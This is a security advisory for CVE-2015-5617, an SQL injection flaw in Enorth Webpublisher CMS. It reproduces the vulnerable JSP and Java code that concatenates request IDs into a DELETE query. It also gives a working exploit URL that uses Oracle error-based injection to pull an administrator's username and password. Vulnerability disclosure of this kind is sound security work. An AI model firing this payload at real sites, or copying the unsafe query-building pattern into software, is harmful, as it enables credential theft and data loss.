@@ -1,0 +1,82 @@
+id: 24040
+date: 08/14/2015
+title: Enorth Webpublisher CMS SQL Injection Vulnerability
+author: xin.wang
+cves: CVE-2015-5617
+
+Title:
+====
+[CVE-2015-5617]Enorth Webpublisher CMS  SQL Injection from delete_pending_news.jsp cbNewsid 
+
+
+Vendor:
+======
+http://products.enorth.com.cn/bfnrglxt/index.shtml
+Enorth Webpublisher CMS so far of the scale of tens of thousands of web sites, with the government, enterprises, scientific research and education and media industries fields such as nearly thousands of business users. 
+
+
+Versions Affected: 
+==============
+All versions
+
+
+Author: 
+======
+xin.wang(xin.wang(at)dbappsecurity.com.cn)
+
+
+Vulnerability Description:
+====================
+/pub/m_pending_news/delete_pending_news.jsp
+<%
+String[] newsIdGroup;
+
+newsIdGroup = request.getParameterValues("cbNewsId");
+if (newsIdGroup == null || newsIdGroup.length == 0) {
+  throw new P3Exception("mbx_news_submit_empty_news_id");
+} else {
+    penTran.deletePendingNews(newsIdGroup);
+}
+%>
+
+/WEB-INF/classes/cn/com/enorth/pub3/m_news/PendingNewsBean.class
+
+  public void deletePendingNews(String[] newsIds) throws Exception {
+    Connection cn = null;
+    PreparedStatement pstm = null;
+    try {
+      StringBuffer buf = new StringBuffer();
+      buf.append("delete from tn_pending_news where news_id in (");
+      int i = 0; for (int len = newsIds.length; i < len; i++) {
+        buf.append(newsIds[i]).append(",");
+      }
+      buf.append("-1)");
+      cn = P3DBTools.getPubConnection();
+      pstm = cn.prepareStatement(buf.toString());
+      pstm.executeUpdate();//执行
+      cn.commit();
+    } catch (Exception ex) {
+      P3DBTools.rollback(cn);
+      throw ex;
+    } finally {
+      P3DBTools.freeConnection(cn);
+    }
+  }
+}
+
+
+Exploit:
+======
+http://website.com/pub/m_pending_news/delete_pending_news.jsp?cbNewsId=2222)%20and%201=ctxsys.drithsx.sn(1,(select%20USER_NAME||PASS_WORD%20from%20TN_USER%20WHERE%20USER_ID=1))—
+
+
+
+Vulnerability Disclosure Timeline:
+
+===========================
+2015-07-28        Found The Vulnerability
+2015-08-02        Submitted To The Vendor
+2015-08-03        Fixed
+2015-08-13        Public Disclosure
+
+#  0day.today [2023-03-25]  #
